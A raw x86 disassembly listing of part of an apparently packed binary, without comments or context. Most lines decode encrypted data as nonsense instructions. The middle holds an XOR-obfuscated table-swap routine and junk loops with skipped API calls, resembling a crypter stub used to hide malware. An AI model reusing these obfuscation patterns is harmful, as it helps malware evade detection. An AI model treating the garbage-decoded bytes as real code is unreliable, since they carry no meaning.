  42cf96:	aad    0xc6
  42cf98:	rol    ah,0xfd
  42cf9b:	loope  0x42cf65
  42cf9d:	retf   
  42cf9e:	jecxz  0x42cf63
  42cfa0:	lods   al,BYTE PTR ds:[esi]
  42cfa1:	imul   ch
  42cfa3:	(bad)
  42cfa6:	enter  0xefee,0xc4
  42cfaa:	hlt    
  42cfab:	mov    eax,0xdbded3cf
  42cfb0:	div    bl
  42cfb2:	(bad)  
  42cfb4:	mov    ecx,0x10fc3fc
  42cfb9:	jecxz  0x42cf97
  42cfbb:	jmp    0xaccb:0xb3ce0c0e
  42cfc2:	stos   DWORD PTR es:[edi],eax
  42cfc3:	shl    ecx,cl
  42cfc5:	mov    cl,0xd0
  42cfc7:	xlat   BYTE PTR ds:[ebx]
  42cfc8:	out    0xb6,eax
  42cfca:	mov    bh,0xca
  42cfcc:	add    bl,al
  42cfce:	enter  0xc7cc,0x0
  42cfd2:	in     eax,0x7
  42cfd4:	ffreep st(4)
  42cfd6:	test   cl,0xdb
  42cfd9:	enter  0xdbd8,0x3
  42cfdd:	cld    
  42cfde:	jecxz  0x42cfa9
  42cfe0:	out    0xc6,al
  42cfe2:	jmp    0xf73ab9ae
  42cfe7:	hlt    
  42cfe8:	into   
  42cfe9:	jmp    0x42cfc9
  42cfeb:	mov    ch,0xf6
  42cfed:	clc    
  42cfee:	icebp  
  42cfef:	out    dx,al
  42cff0:	cmc    
  42cff1:	out    0xe5,al
  42cff3:	imul   ebx
  42cff5:	in     eax,0xd4
  42cff7:	ret    0xe0fc
  42cffa:	or     ebx,ecx
  42cffc:	adc    ecx,esp
  42cffe:	faddp  st(1),st
  42d000:	imul   DWORD PTR [eax-0x253f2a3d]
  42d006:	scas   eax,DWORD PTR es:[edi]
  42d007:	(bad)  
  42d008:	into   
  42d009:	mov    ch,0xb7
  42d00b:	stc    
  42d00c:	mov    esi,0xe0b9bd
  42d011:	add    ebx,ebx
  42d013:	add    bh,bl
  42d015:	add    edx,ecx
  42d017:	or     BYTE PTR [esi],al
  42d019:	(bad)  
  42d01a:	into   
  42d01b:	or     BYTE PTR [eax],al
  42d01d:	shl    BYTE PTR [edx-0x4d134d41],cl
  42d023:	mov    esp,0xeeceb7b7
  42d028:	out    dx,eax
  42d029:	(bad)  
  42d02a:	repz cld 
  42d02c:	cmc    
  42d02d:	cmc    
  42d02e:	rcl    ch,cl
  42d030:	push   es
  42d031:	aad    0xfa
  42d033:	loope  0x42d005
  42d035:	mov    eax,0x6eee5f8
  42d03a:	int    0xf4
  42d03c:	ror    ecx,cl
  42d03e:	test   eax,0xadd2d7b2
  42d043:	(bad)  
  42d044:	jmp    0xc02a8818
  42d049:	mov    edi,0xeafcb4bf
  42d04e:	loopne 0x42d010
  42d050:	cmc    
  42d051:	clc    
  42d052:	test   ah,0xdf
  42d055:	add    edx,esi
  42d057:	fcom   st(4)
  42d059:	or     ch,ch
  42d05b:	stc    
  42d05c:	fldpi  
  42d05e:	in     eax,0xac
  42d060:	ret    
  42d061:	rcl    ch,1
  42d063:	sar    bl,1
  42d065:	int3   
  42d066:	jmp    0x42d048
  42d068:	sti    
  42d069:	fcmovne st,st(2)
  42d06b:	aad    0xd4
  42d06d:	ret    
  42d06e:	loope  0x42d068
  42d070:	aam    0xfd
  42d072:	fadd   QWORD PTR [eax]
  42d074:	div    edx
  42d076:	out    0xc0,eax
  42d078:	(bad)  
  42d07a:	in     eax,0x5
  42d07c:	loop   0x42d083
  42d07e:	in     eax,0xed
  42d080:	mov    edi,0xc8d3acc5
  42d085:	retf   
  42d086:	in     al,dx
  42d087:	ror    esp,1
  42d089:	std    
  42d08a:	aam    0xfe
  42d08c:	in     al,dx
  42d08d:	mov    al,0xdb
  42d08f:	add    esp,ebx
  42d091:	test   edx,0x1d9fde7
  42d097:	(bad)  
  42d099:	cld    
  42d09a:	pmaxub mm1,mm4
  42d09d:	add    al,0xc1
  42d09f:	out    dx,al
  42d0a0:	mov    edi,0xfae7acdc
  42d0a5:	stc    
  42d0a6:	sti    
  42d0a7:	repnz (bad) 
  42d0a9:	out    dx,al
  42d0aa:	(bad)  
  42d0ac:	rol    DWORD PTR [edx],cl
  42d0ae:	(bad)  
  42d0b0:	in     eax,dx
  42d0b1:	jecxz  0x42d08b
  42d0b3:	lds    ecx,FWORD PTR [ebx]
  42d0b5:	add    ecx,ebp
  42d0b7:	aam    0xf4
  42d0b9:	in     al,0x6
  42d0bb:	jecxz  0x42d0c4
  42d0bd:	fxch   st(0)
  42d0bf:	loope  0x42d0af
  42d0c1:	fst    st(7)
  42d0c3:	stos   BYTE PTR es:[edi],al
  42d0c4:	mov    dl,0xe9
  42d0c6:	in     eax,0xd9
  42d0c8:	mov    ebx,0xd3fccede
  42d0cd:	mov    esi,0xe1fdbdba
  42d0d2:	test   ch,0xc6
  42d0d5:	loopne 0x42d0e1
  42d0d7:	fild   DWORD PTR [eax]
  42d0d9:	in     al,0xfa
  42d0db:	int    0xe
  42d0dd:	add    DWORD PTR [ebx-0x32084e43],esi
  42d0e3:	mov    ch,0xb7
  42d0e5:	mov    ch,0xd3
  42d0e7:	(bad)  
  42d0e8:	aad    0xd0
  42d0ea:	sar    DWORD PTR [esi+0xbbbbd9],cl
  42d0f0:	shl    ebx,1
  42d0f2:	rol    BYTE PTR [edi],cl
  42d0f4:	inc    DWORD PTR [ebx]
  42d0f6:	out    0xc9,eax
  42d0f8:	out    dx,eax
  42d0f9:	or     ebx,edx
  42d0fb:	(bad)
  42d0fe:	mov    dl,0xca
  42d100:	loop   0x42d0f7
  42d102:	icebp  
  42d103:	iret   
  42d104:	sti    
  42d105:	mov    cl,0xd1
  42d107:	retf   
  42d108:	clc    
  42d109:	clc    
  42d10a:	hlt    
  42d10b:	(bad)  
  42d10d:	cli    
  42d10e:	mov    esi,0xf8e5fec2
  42d113:	repnz cld 
  42d115:	out    0xd1,al
  42d117:	call   edi
  42d119:	cli    
  42d11a:	out    dx,eax
  42d11b:	stc    
  42d11c:	(bad)  
  42d11e:	into   
  42d11f:	out    0xcf,al
  42d121:	mov    edi,0xdbf1caec
  42d127:	out    0xf7,eax
  42d129:	not    esp
  42d12b:	jecxz  0x42d100
  42d12d:	mov    al,0xf4
  42d12f:	hlt    
  42d130:	fadd   st,st(6)
  42d132:	add    ecx,esp
  42d134:	jmp    0xe7fa:0xd5e9e0ff
  42d13b:	cli    
  42d13c:	or     eax,0xe0edefcc
  42d141:	scas   eax,DWORD PTR es:[edi]
  42d142:	shl    BYTE PTR [esi-0xf454f0c],1
  42d148:	mov    ah,0xe4
  42d14a:	fdiv   st,st(4)
  42d14c:	fmul   st(4),st
  42d14e:	(bad)  
  42d14f:	fdivr  st,st(1)
  42d151:	in     eax,dx
  42d152:	aad    0xcc
  42d154:	in     eax,0xb
  42d156:	or     bl,cl
  42d158:	fstp   st(5)
  42d15a:	(bad)  
  42d15c:	out    dx,al
  42d15d:	(bad)  
  42d15e:	fldcw  WORD PTR [edx-0x17192920]
  42d164:	shl    eax,cl
  42d166:	cmc    
  42d167:	(bad)  
  42d169:	lock sar BYTE PTR [ebp-0x40e4132],1
  42d170:	fidivr WORD PTR [ebp-0x19241404]
  42d176:	or     ebx,ebp
  42d178:	add    eax,esp
  42d17a:	in     eax,0xce
  42d17c:	stc    
  42d17d:	stc    
  42d17e:	fsubr  DWORD PTR [ebp-0x16500a2a]
  42d184:	loop   0x42d175
  42d186:	out    dx,eax
  42d187:	mov    dh,0xd6
  42d189:	std    
  42d18a:	leave  
  42d18b:	retf   
  42d18c:	retf   0xf1f0
  42d18f:	xlat   BYTE PTR ds:[ebx]
  42d190:	not    ah
  42d192:	xlat   BYTE PTR ds:[ebx]
  42d193:	ret    
  42d194:	les    eax,FWORD PTR [edi]
  42d196:	shr    edx,1
  42d198:	sti    
  42d199:	fld    QWORD PTR [ebx]
  42d19b:	les    ecx,FWORD PTR ds:0xf3c9c2ce
  42d1a1:	cmc    
  42d1a2:	ret    0xc7c9
  42d1a5:	int3   
  42d1a6:	mov    cl,0xcc
  42d1a8:	retf   0xecd4
  42d1ab:	mov    edx,0xe7ffe9bf
  42d1b0:	iret   
  42d1b1:	add    bh,bh
  42d1b3:	int3   
  42d1b4:	stc    
  42d1b5:	in     al,0xe1
  42d1b7:	ror    bh,0xe7
  42d1ba:	in     eax,dx
  42d1bb:	push   cs
  42d1bc:	iret   
  42d1bd:	add    ch,BYTE PTR [ecx+eax*8-0x3b362f23]
  42d1c4:	in     al,dx
  42d1c5:	jmp    0xfbfdcdaf
  42d1ca:	fdivp  st(6),st
  42d1cc:	cld    
  42d1cd:	lock (bad) 
  42d1d0:	cli    
  42d1d1:	in     eax,dx
  42d1d2:	mov    ebx,0xf4f8d8f1
  42d1d7:	fcomip st,st(4)
  42d1d9:	pmaxsw mm4,mm2
  42d1dc:	out    0xdf,al
  42d1de:	leave  
  42d1df:	lods   eax,DWORD PTR ds:[esi]
  42d1e0:	mov    esp,0xe3d1cfdc
  42d1e5:	aad    0xf0
  42d1e7:	sar    BYTE PTR [eax-0x220f0014],1
  42d1ed:	mov    ah,0xcf
  42d1ef:	add    esi,ebp
  42d1f1:	out    0xe4,al
  42d1f3:	or     edi,ecx
  42d1f5:	retf   0xffa
  42d1f8:	fcmovnu st,st(2)
  42d1fa:	call   0xe927e512
  42d1ff:	enter  0xe2c1,0xdc
  42d203:	out    dx,eax
  42d204:	test   eax,0xe4bad8b5
  42d209:	fcmovb st,st(4)
  42d20b:	clc    
  42d20c:	leave  
  42d20d:	stc    
  42d20e:	out    dx,al
  42d20f:	cld    
  42d210:	into   
  42d211:	fnstsw WORD PTR [edx+eax*1+0x609c1eb]
  42d218:	dec    BYTE PTR ds:0xecfc02da
  42d21e:	int3   
  42d21f:	in     al,dx
  42d220:	int    0xf1
  42d222:	rcl    esi,1
  42d224:	out    0xc0,al
  42d226:	mov    al,0xbb
  42d228:	icebp  
  42d229:	sar    edi,1
  42d22b:	mov    esp,0xeef5f1b8
  42d230:	clc    
  42d231:	out    dx,al
  42d232:	add    al,0xde
  42d234:	jecxz  0x42d212
  42d236:	(bad)  
  42d237:	jmp    0x42d21b
  42d239:	test   BYTE PTR ds:0xbee20fc2,0xf2
  42d240:	xlat   BYTE PTR ds:[ebx]
  42d241:	(bad)
  42d245:	into   
  42d246:	mov    bl,0xb7
  42d248:	iret   
  42d249:	out    dx,al
  42d24a:	stc    
  42d24b:	int3   
  42d24c:	mov    eax,0xd6d2e0da
  42d251:	mov    esi,0xdec1d8
  42d256:	(bad)  
  42d257:	xlat   BYTE PTR ds:[ebx]
  42d258:	push   cs
  42d259:	leave  
  42d25a:	stc    
  42d25b:	into   
  42d25c:	add    DWORD PTR [ecx],eax
  42d25e:	(bad)  
  42d260:	icebp  
  42d261:	int    0xad
  42d263:	ret    
  42d264:	aam    0xda
  42d266:	call   0xcc02a94f
  42d26b:	int    0xe8
  42d26d:	mov    edx,0xd2d5e2c3
  42d272:	add    eax,0xe8b8f7e4
  42d277:	add    al,0xb
  42d279:	test   BYTE PTR [ebx],0x3
  42d27c:	fisttp QWORD PTR [ebp*8-0x1a363d43]
  42d283:	iret   
  42d284:	sti    
  42d285:	in     eax,dx
  42d286:	jmp    0xbc029b39
  42d28b:	sti    
  42d28c:	mov    eax,0xf6f9f6e1
  42d291:	int    0xc6
  42d293:	mov    edx,0xe6c3d504
  42d298:	retf   0xfc03
  42d29b:	push   es
  42d29c:	iret   
  42d29d:	repz jmp 0x42d262
  42d2a0:	(bad)  
  42d2a1:	into   
  42d2a2:	shl    esi,1
  42d2a4:	jecxz  0x42d290
  42d2a6:	stc    
  42d2a7:	hlt    
  42d2a8:	int    0xcc
  42d2aa:	mov    ebx,0x1b9d6ff
  42d2af:	add    edx,edi
  42d2b1:	add    edi,esp
  42d2b3:	in     al,dx
  42d2b4:	pop    es
  42d2b5:	retf   
  42d2b6:	fmulp  st(3),st
  42d2b8:	shr    ebx,0xe
  42d2bb:	jecxz  0x42d2ab
  42d2bd:	jmp    0x42d2a7
  42d2bf:	mov    esi,0xefe3ecf2
  42d2c4:	(bad)  
  42d2c6:	int3   
  42d2c7:	fnsetpm(287 only) 
  42d2c9:	mov    edi,0xfcbad4b5
  42d2ce:	mov    esi,0xd3c702f9
  42d2d3:	(bad)  
  42d2d5:	(bad)  
  42d2d6:	mov    edi,0x4f40501
  42d2db:	jmp    0xcfec:0xe2e3f8de
  42d2e2:	fdiv   QWORD PTR [ebp+eiz*8-0x240d0a36]
  42d2e9:	lods   al,BYTE PTR ds:[esi]
  42d2ea:	repnz not bl
  42d2ed:	(bad)  
  42d2ef:	cmc    
  42d2f0:	push   es
  42d2f1:	add    esi,edi
  42d2f3:	idiv   ecx
  42d2f5:	fsincos 
  42d2f7:	xlat   BYTE PTR ds:[ebx]
  42d2f8:	in     al,0xd5
  42d2fa:	out    0xf4,al
  42d2fc:	iret   
  42d2fd:	fidivr WORD PTR [esi-0x2b2c3619]
  42d303:	into   
  42d304:	ret    
  42d305:	mov    ch,0xe5
  42d307:	in     eax,0xc8
  42d309:	in     al,0xcd
  42d30b:	mov    ebx,0xf2c9bddf
  42d310:	loopne 0x42d2ee
  42d312:	out    0xe7,eax
  42d314:	in     eax,0xea
  42d316:	neg    ch
  42d318:	add    ecx,ebx
  42d31a:	or     eax,0xacf3e1e6
  42d31f:	fcomp  st(5)
  42d321:	icebp  
  42d322:	jecxz  0x42d2e4
  42d324:	mul    dh
  42d326:	mov    ah,0xea
  42d328:	shr    cl,1
  42d32a:	(bad)
  42d32d:	mov    esi,0xdf03b8f1
  42d332:	jecxz  0x42d320
  42d334:	fcmovnbe st,st(5)
  42d336:	or     ecx,ecx
  42d338:	jmp    0xe5dd:0xfbe9e806
  42d33f:	into   
  42d340:	retf   
  42d341:	enter  0xe7b7,0xcf
  42d345:	sti    
  42d346:	out    0xb7,al
  42d348:	out    0xd2,eax
  42d34a:	(bad)  
  42d34b:	jmp    0x42d2fe
  42d34d:	mov    esp,0x5efb8c3
  42d352:	shr    ah,1
  42d354:	or     bh,dh
  42d356:	or     edx,edi
  42d358:	out    0xee,eax
  42d35a:	loop   0x42d358
  42d35c:	jmp    0x42d349
  42d35e:	mov    edi,0xecf5cfbd
  42d363:	mov    ch,0xc5
  42d365:	lods   al,BYTE PTR ds:[esi]
  42d366:	out    0xf7,eax
  42d368:	sti    
  42d369:	into   
  42d36a:	(bad)  
  42d36c:	retf   
  42d36d:	fucomp st(7)
  42d36f:	fucomp st(5)
  42d371:	repnz add al,0xd6
  42d374:	mov    esp,0xd7faf1
  42d379:	out    0xcf,eax
  42d37b:	les    ecx,FWORD PTR ds:0xd6ddcd05
  42d381:	int    0xcb
  42d383:	(bad)
  42d386:	into   
  42d387:	mov    ecx,0xc4e9d6d2
  42d38c:	mov    esi,0xfbecf0fa
  42d391:	add    dl,dl
  42d393:	cmc    
  42d394:	add    ecx,edi
  42d396:	add    DWORD PTR [esi-0x11fbff04],edi
  42d39c:	push   cs
  42d39d:	push   cs
  42d39e:	icebp  
  42d39f:	not    esi
  42d3a1:	out    0xe2,al
  42d3a3:	fcmovne st,st(5)
  42d3a5:	div    bh
  42d3a7:	mov    eax,0xfbdacdd6
  42d3ac:	sti    
  42d3ad:	jmp    0xd1fe:0xc6f6d7df
  42d3b4:	repz pop es
  42d3b6:	retf   
  42d3b7:	(bad)  
  42d3b8:	fmul   st(6),st
  42d3ba:	or     al,0xe7
  42d3bc:	jecxz  0x42d3c5
  42d3be:	scas   al,BYTE PTR es:[edi]
  42d3bf:	shl    ecx,1
  42d3c1:	mov    bl,0xc3
  42d3c3:	imul   bl
  42d3c5:	int    0xf9
  42d3c7:	lds    edi,FWORD PTR [ecx-0x11302731]
  42d3cd:	cli    
  42d3ce:	mov    esi,0xd5d8bef4
  42d3d3:	shl    eax,1
  42d3d5:	test   ebx,0xed0fde0f
  42d3db:	int    0xe2
  42d3dd:	in     eax,0xc2
  42d3df:	leave  
  42d3e0:	mov    dl,0xd6
  42d3e2:	mov    bl,0xc0
  42d3e4:	in     eax,0xf7
  42d3e6:	repnz mov bh,0xd8
  42d3e9:	shl    esi,cl
  42d3eb:	int3   
  42d3ec:	mov    eax,0x201fade
  42d3f1:	mov    ecx,DWORD PTR [ebp-0x8]
  42d3f4:	mov    al,BYTE PTR [ecx+eax*1+0x3272fb]
  42d3fb:	mov    BYTE PTR [ebp-0x25],al
  42d3fe:	mov    eax,DWORD PTR [ebp+0xc]
  42d401:	xor    eax,0x75108b5
  42d406:	mov    ecx,DWORD PTR [ebp+0x8]
  42d409:	xor    ecx,0x75108b5
  42d40f:	mov    edx,DWORD PTR [ebp-0x8]
  42d412:	mov    esi,DWORD PTR [ebp-0x8]
  42d415:	mov    al,BYTE PTR [esi+eax*1+0x3272fb]
  42d41c:	mov    BYTE PTR [edx+ecx*1+0x3272fb],al
  42d423:	mov    eax,DWORD PTR [ebp+0xc]
  42d426:	xor    eax,0x75108b5
  42d42b:	mov    ecx,DWORD PTR [ebp-0x8]
  42d42e:	mov    dl,BYTE PTR [ebp-0x25]
  42d431:	mov    BYTE PTR [ecx+eax*1+0x3272fb],dl
  42d438:	mov    eax,DWORD PTR [ebp+0xc]
  42d43b:	xor    eax,0x75108b5
  42d440:	add    eax,0x3272fb
  42d445:	pop    esi
  42d446:	leave  
  42d447:	ret    0x10
  42d44a:	push   ebp
  42d44b:	mov    ebp,esp
  42d44d:	sub    esp,0xa0
  42d453:	mov    eax,ds:0x43739f
  42d458:	adc    ecx,DWORD PTR ds:0x43775b
  42d45e:	mov    DWORD PTR [ebp-0x2c],eax
  42d461:	lea    eax,[ebp-0x3c]
  42d464:	mov    DWORD PTR [ebp-0x28],eax
  42d467:	mov    DWORD PTR ds:0x437763,0x13
  42d471:	cmp    DWORD PTR ds:0x437763,0x0
  42d478:	je     0x42d4c5
  42d47e:	cmp    DWORD PTR ds:0x437763,0x5
  42d485:	jle    0x42d4c5
  42d48b:	jmp    0x42d499
  42d490:	push   DWORD PTR [ebp-0x1c]
  42d493:	call   DWORD PTR ds:0x43c998
  42d499:	cmp    DWORD PTR ds:0x437763,0x6
  42d4a0:	jne    0x42d4b3
  42d4a6:	mov    ecx,DWORD PTR ds:0x437763
  42d4ac:	dec    ecx
  42d4ad:	mov    DWORD PTR ds:0x437763,ecx
  42d4b3:	mov    ecx,DWORD PTR ds:0x437763
  42d4b9:	dec    ecx
  42d4ba:	mov    DWORD PTR ds:0x437763,ecx
  42d4c0:	jmp    0x42d471
  42d4c5:	mov    eax,DWORD PTR [ebp-0x28]
  42d4c8:	and    DWORD PTR ds:0x437713,0x0
  42d4d2:	xor    ecx,ecx
  42d4d4:	add    ecx,DWORD PTR ds:0x437713
  42d4da:	inc    ecx
  42d4db:	mov    DWORD PTR ds:0x437713,ecx
  42d4e1:	cmp    DWORD PTR ds:0x437713,0x2a
  42d4e8:	jl     0x42d514
  42d4ee:	jmp    0x42d507
  42d4f3:	push   DWORD PTR [ebp-0x1c]
  42d4f6:	push   DWORD PTR [ebp-0x20]
  42d4f9:	push   0x43779f
  42d4fe:	push   DWORD PTR [ebp-0x24]
  42d501:	call   DWORD PTR ds:0x43c99c
  42d507:	cmp    DWORD PTR ds:0x437713,0x1e
  42d50e:	jb     0x42d4d2
  42d514:	mov    ecx,DWORD PTR ds:0x4374bf
  42d51a:	adc    DWORD PTR ds:0x437727,0x6e64
  42d524:	mov    DWORD PTR [eax],ecx
  42d526:	adc    ecx,DWORD PTR ds:0x43772f
  42d52c:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  42d533:	adc    DWORD PTR ds:0x437733,ebx
  42d539:	mov    DWORD PTR [ebp-0x90],0xf89c85b3
  42d543:	xor    eax,eax
  42d545:	lea    eax,[ebp-0x4]
  42d548:	adc    DWORD PTR ds:0x43777f,0x7eae
  42d552:	mov    DWORD PTR [ebp-0x18],eax
  42d555:	mov    eax,DWORD PTR [ebp-0x18]
  42d558:	or     ecx,DWORD PTR ds:0x437727
  42d55e:	mov    eax,DWORD PTR [eax]
  42d560:	xor    ecx,ecx
  42d562:	xor    ecx,DWORD PTR ds:0x4377cb
  42d568:	mov    ecx,DWORD PTR [ecx]
  42d56a:	add    DWORD PTR ds:0x43778f,ecx
  42d570:	mov    ecx,DWORD PTR [ebp-0x4]
  42d573:	sub    eax,ecx
  42d575:	mov    ecx,DWORD PTR [ebp-0x18]
  42d578:	mov    DWORD PTR ds:0x437717,0x6eff
  42d582:	mov    DWORD PTR [ecx],eax
  42d584:	xor    eax,DWORD PTR ds:0x43771f
  42d58a:	mov    eax,DWORD PTR [ebp-0x18]
  42d58d:	dec    DWORD PTR ds:0x437737
  42d593:	mov    eax,DWORD PTR [eax]
  42d595:	inc    ecx
  42d596:	xor    eax,0xf89cb5b0
  42d59b:	mov    ecx,DWORD PTR [ebp-0x18]
  42d59e:	adc    DWORD PTR ds:0x43772b,0x999
  42d5a8:	mov    DWORD PTR [ecx],eax
  42d5aa:	mov    DWORD PTR ds:0x437753,0x18
  42d5b4:	cmp    DWORD PTR ds:0x437753,0x0
  42d5bb:	je     0x42d600
  42d5c1:	cmp    DWORD PTR ds:0x437753,0x21
  42d5c8:	jb     0x42d600
  42d5ce:	jmp    0x42d5ec
  42d5d3:	push   0x76ac
  42d5d8:	push   0x2657
  42d5dd:	push   DWORD PTR [ebp-0x14]
  42d5e0:	push   DWORD PTR [ebp-0x28]
  42d5e3:	push   DWORD PTR [ebp-0x24]
  42d5e6:	call   DWORD PTR ds:0x43c9a0
  42d5ec:	xor    ecx,ecx
  42d5ee:	or     ecx,DWORD PTR ds:0x437753
  42d5f4:	dec    ecx
  42d5f5:	mov    DWORD PTR ds:0x437753,ecx
  42d5fb:	jmp    0x42d5b4
  42d600:	lea    eax,[ebp-0x8]
  42d603:	mov    DWORD PTR ds:0x437787,0x1b
  42d60d:	cmp    DWORD PTR ds:0x437787,0x0
  42d614:	je     0x42d64e
  42d61a:	cmp    DWORD PTR ds:0x437787,0x23
  42d621:	jl     0x42d64e
  42d627:	jmp    0x42d63a
  42d62c:	push   0x8dd4
  42d631:	push   DWORD PTR [ebp-0x18]
  42d634:	call   DWORD PTR ds:0x43c9a4
  42d63a:	xor    ecx,ecx
  42d63c:	xor    ecx,DWORD PTR ds:0x437787
  42d642:	dec    ecx
  42d643:	mov    DWORD PTR ds:0x437787,ecx
  42d649:	jmp    0x42d60d
  42d64e:	mov    DWORD PTR [ebp-0x14],eax
  42d651:	not    eax
  42d653:	mov    eax,DWORD PTR [ebp-0x14]
  42d656:	xor    DWORD PTR ds:0x43774b,ecx
  42d65c:	mov    eax,DWORD PTR [eax]
  42d65e:	xor    DWORD PTR ds:0x43779b,edi
  42d664:	mov    ecx,DWORD PTR [ebp-0x8]
  42d667:	neg    DWORD PTR ds:0x4377b3
  42d66d:	sub    eax,ecx
  42d66f:	and    ecx,DWORD PTR ds:0x43775f
  42d675:	mov    ecx,DWORD PTR [ebp-0x14]
  42d678:	mov    DWORD PTR [ecx],eax
  42d67a:	adc    eax,DWORD PTR ds:0x43771b
  42d680:	mov    eax,DWORD PTR [ebp-0x14]
  42d683:	mov    DWORD PTR ds:0x437757,0x10
  42d68d:	cmp    DWORD PTR ds:0x437757,0x0
  42d694:	je     0x42d6d0
  42d69a:	cmp    DWORD PTR ds:0x437757,0x12
  42d6a1:	jge    0x42d6d0
  42d6a7:	jmp    0x42d6bc
  42d6ac:	push   0x155c
  42d6b1:	push   0x7a14
  42d6b6:	call   DWORD PTR ds:0x43c9a8
  42d6bc:	xor    ecx,ecx
  42d6be:	xor    ecx,DWORD PTR ds:0x437757
  42d6c4:	dec    ecx
  42d6c5:	mov    DWORD PTR ds:0x437757,ecx
  42d6cb:	jmp    0x42d68d
  42d6d0:	mov    eax,DWORD PTR [eax]
  42d6d2:	and    DWORD PTR ds:0x43775b,0x0
  42d6dc:	xor    ecx,ecx
  42d6de:	or     ecx,DWORD PTR ds:0x43775b
  42d6e4:	inc    ecx
  42d6e5:	mov    DWORD PTR ds:0x43775b,ecx
  42d6eb:	cmp    DWORD PTR ds:0x43775b,0x1e
  42d6f2:	jb     0x42d71a
  42d6f8:	jmp    0x42d70d
  42d6fd:	push   0x43775b
  42d702:	push   0x3fc2
  42d707:	call   DWORD PTR ds:0x43c9ac
  42d70d:	cmp    DWORD PTR ds:0x43775b,0x14
  42d714:	jb     0x42d6dc
  42d71a:	or     eax,0xf89f05b0
  42d71f:	and    DWORD PTR ds:0x437763,0x0
  42d729:	mov    ecx,DWORD PTR ds:0x437763
  42d72f:	inc    ecx
  42d730:	mov    DWORD PTR ds:0x437763,ecx
  42d736:	cmp    DWORD PTR ds:0x437763,0x1d
  42d73d:	jg     0x42d763
  42d743:	jmp    0x42d756
  42d748:	push   DWORD PTR [ebp-0x24]
  42d74b:	push   0x79a8
  42d750:	call   DWORD PTR ds:0x43c9b0
  42d756:	cmp    DWORD PTR ds:0x437763,0x12
  42d75d:	jb     0x42d729
  42d763:	mov    ecx,DWORD PTR [ebp-0x14]
  42d766:	adc    DWORD PTR ds:0x43778f,0x4377ab
  42d770:	mov    DWORD PTR [ecx],eax
  42d772:	sub    ecx,DWORD PTR ds:0x43779f
  42d778:	lea    eax,[ebp-0x10]
  42d77b:	mov    DWORD PTR [ebp-0x8c],eax
  42d781:	and    DWORD PTR ds:0x437743,0x0
  42d78b:	mov    eax,ds:0x437743
  42d790:	inc    eax
  42d791:	mov    ds:0x437743,eax
  42d796:	cmp    DWORD PTR ds:0x437743,0x24
  42d79d:	jbe    0x42d7ca
  42d7a3:	jmp    0x42d7bd
  42d7a8:	push   0x43778f
  42d7ad:	push   0x43778f
  42d7b2:	push   0x7a81
  42d7b7:	call   DWORD PTR ds:0x43c9b4
  42d7bd:	cmp    DWORD PTR ds:0x437743,0x18
  42d7c4:	jb     0x42d78b
  42d7ca:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7d0:	sub    DWORD PTR ds:0x437777,ecx
  42d7d6:	mov    eax,DWORD PTR [eax]
  42d7d8:	neg    ecx
  42d7da:	mov    ecx,DWORD PTR [ebp-0x10]
  42d7dd:	sub    DWORD PTR ds:0x43772f,0x437757
  42d7e7:	sub    eax,ecx
  42d7e9:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d7ef:	mov    DWORD PTR [ecx],eax
  42d7f1:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7f7:	mov    eax,DWORD PTR [eax]
  42d7f9:	or     eax,0xf89c85f0
  42d7fe:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d804:	mov    DWORD PTR [ecx],eax
  42d806:	lea    eax,[ebp-0x24]
  42d809:	mov    DWORD PTR [ebp-0x34],eax
  42d80c:	mov    eax,DWORD PTR [ebp-0x34]
  42d80f:	mov    eax,DWORD PTR [eax]
  42d811:	mov    ecx,DWORD PTR [ebp-0x24]
  42d814:	sub    eax,ecx
  42d816:	mov    ecx,DWORD PTR [ebp-0x34]
  42d819:	mov    DWORD PTR [ecx],eax
  42d81b:	mov    eax,DWORD PTR [ebp-0x34]
  42d81e:	mov    eax,DWORD PTR [eax]
  42d820:	or     eax,0xf89c8590
  42d825:	jmp    0x42fbb7
  42d82a:	out    0xea,al
  42d82c:	sub    edx,DWORD PTR [ebx-0x1199adc9]
  42d832:	add    eax,0xf9e63064
  42d837:	shl    esp,0xa9
  42d83a:	or     dh,dh
  42d83c:	jns    0x42d8b9
  42d83e:	out    dx,al
  42d83f:	cwde   
  42d840:	jnp    0x42d8bd
  42d842:	std    
  42d843:	jmp    ecx
  42d845:	(bad)  
  42d846:	fcmovnbe st,st(7)
  42d848:	dec    ecx
  42d84a:	or     eax,DWORD PTR [edx]
  42d84c:	loope  0x42d84d
  42d84e:	add    bh,cl
  42d850:	shl    dl,0xa4
  42d853:	rcr    ah,cl
  42d855:	lock fisubr DWORD PTR [edi-0xe142f27]
  42d85c:	fst    st(7)
  42d85e:	mov    edi,0xd5c1bf03
  42d863:	lock mov edx,0xcaebc2d0
  42d869:	(bad)  
  42d86a:	clc    
  42d86b:	out    0xe6,al
  42d86d:	int3   
  42d86e:	in     eax,0xbd
  42d870:	(bad)  
  42d872:	(bad)  
  42d873:	jmp    0x42d85b
  42d875:	out    dx,eax
  42d876:	fcmovbe st,st(6)
  42d878:	into   
  42d879:	jmp    0x42d86e
  42d87b:	iret   
  42d87c:	out    dx,al
  42d87d:	iret   
  42d87e:	icebp  
  42d87f:	ret    0xf4f6
  42d882:	cld    
  42d883:	not    bh
  42d885:	ret    
  42d886:	dec    dl
  42d888:	out    0xe0,eax
  42d88a:	add    edi,esp
  42d88c:	retf   
  42d88d:	push   es
  42d88e:	add    ch,bl
  42d890:	retf   
  42d891:	shr    al,0xbc
  42d894:	ror    ebp,0xf0
  42d897:	(bad)  
  42d899:	(bad)  
  42d89b:	xlat   BYTE PTR ds:[ebx]
  42d89c:	sar    bl,1
  42d89e:	mov    edi,0xc3e1cdf7
  42d8a3:	ret    0x2e0
  42d8a6:	test   BYTE PTR [edi],0xd8
  42d8a9:	pop    es
  42d8aa:	or     bl,al
  42d8ac:	push   cs
  42d8ad:	fdivp  st(6),st
  42d8af:	icebp  
  42d8b0:	mov    bl,0xee
  42d8b2:	loop   0x42d8a0
  42d8b4:	rol    dl,cl
  42d8b6:	hlt    
  42d8b7:	int    0xf9
  42d8b9:	mov    ch,0xec
  42d8bb:	cmc    
  42d8bc:	mov    esi,0xdaf6f8e3
  42d8c1:	fidivr DWORD PTR [esi-0x3c283d3a]
  42d8c7:	(bad)  
  42d8c9:	iret   
  42d8ca:	into   
  42d8cb:	fcom   QWORD PTR [ebx]
  42d8cd:	into   
  42d8ce:	int3   
  42d8cf:	mov    edi,0xecece4d2
